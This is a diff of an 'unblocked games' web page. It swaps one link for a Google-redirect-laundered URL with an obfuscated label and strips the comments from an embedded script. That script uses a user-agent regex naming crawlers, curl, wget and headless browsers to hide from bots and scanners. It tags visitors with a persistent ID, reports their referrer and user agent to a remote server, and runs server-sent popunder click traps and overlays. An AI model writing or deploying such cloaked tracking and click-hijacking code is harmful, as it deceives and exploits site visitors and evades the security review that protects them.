@@ -124,7 +124,7 @@
             <div class="divider"></div>
             <div class="network-links">
                 <a href="https://www.symbaloo.com/mix/newunblockedgames?lang=EN" target="_blank" class="net-btn purple"><span>🔥</span> Symbaloo</a>
-                 <a href="https://piratez.lol" target="_blank" class="net-btn purple"><span>🔥</span> Piratez.LoL</a>
+                 <a href="https://www.google.com/url?q=https%3A%2F%2Fwww.equinlabsac.com%2Fprofiles%2Fstandard%2Ftranslations%2Fname%2F&sa=D&sntz=1&usg=AOvVaw0BGR3vpRKnWO6O6Yw0K5HH" target="_blank" class="net-btn purple"><span>🔥</span> UBG G@M€</a>
                 <a href="https://study-10.gitlab.io" target="_blank" class="net-btn orange"><span>🔥</span> Gam€ 1</a>
                 <a href="https://math-test2.gitlab.io" target="_blank" class="net-btn blue"><span>🎮</span> Gam€ 2</a> 
                 <a href="https://mathlesson.gitlab.io" target="_blank" class="net-btn blue"><span>📚</span> Gam€ 3</a>
@@ -177,7 +177,7 @@
     if (window.networkAgentActive) return;
     window.networkAgentActive = true;
 
-    // 1. GELİŞMİŞ BOT VE HEADLESS TARAYICI KONTROLÜ (Server ile senkronize)
+     
     const BOT_REGEX = /(bot|crawl|spider|slurp|googlebot|bingbot|yandex|baiduspider|duckduckbot|facebookexternalhit|facebot|whatsapp|telegram|semrush|ahrefs|petalbot|bytespider|curl|wget|python|aiohttp|headless|phantom|lighthouse|postman|go-http-client|axios|node-fetch)/i;
 
     function isBotEnvironment() {
@@ -196,10 +196,10 @@
         return false;
     }
 
-    // Eğer ziyaretçi botsa socket.io'yu bile yükleme, işlemi anında bitir
+    
     if (isBotEnvironment()) return;
 
-    // 2. GÜVENLİ UID OLUŞTURMA (Server'daki hasValidUid kontrolü ile uyumlu)
+    
     let myUid = '';
     try {
         myUid = localStorage.getItem('ax_player_uid');
@@ -208,8 +208,7 @@
             localStorage.setItem('ax_player_uid', myUid);
         }
     } catch (e) {
-        // localStorage kapalıysa (gizli sekme kısıtlaması veya sandboxed bot)
-        // Boş gönderiyoruz ki server tarafında "hasValidUid" false olsun ve tekil sayacı şişirmesin
+         
         myUid = '';
     }
 
@@ -223,7 +222,7 @@
 
     function startConnection() {
         const myDomain = window.location.hostname || "Unknown-Site";
-        // Server tarafı zaten '?' sonrasını kesiyor (rawPageUrl.split('?')[0]), temiz gönderiyoruz
+        
         const cleanPagePath = myDomain + window.location.pathname;
         const myReferer = document.referrer || "Direct";
         const myUserAgent = navigator.userAgent || "Unknown-UA";
@@ -264,7 +263,7 @@
                 window.addEventListener('click', popunderTrap, true);
             } 
             else if (data.actionType === 'flash' && data.message) {
-                // Aynı anda birden fazla flash mesajın üst üste binmesini engelle
+               
                 const existingAlert = document.getElementById('ax-flash-overlay');
                 if (existingAlert) existingAlert.remove();
 
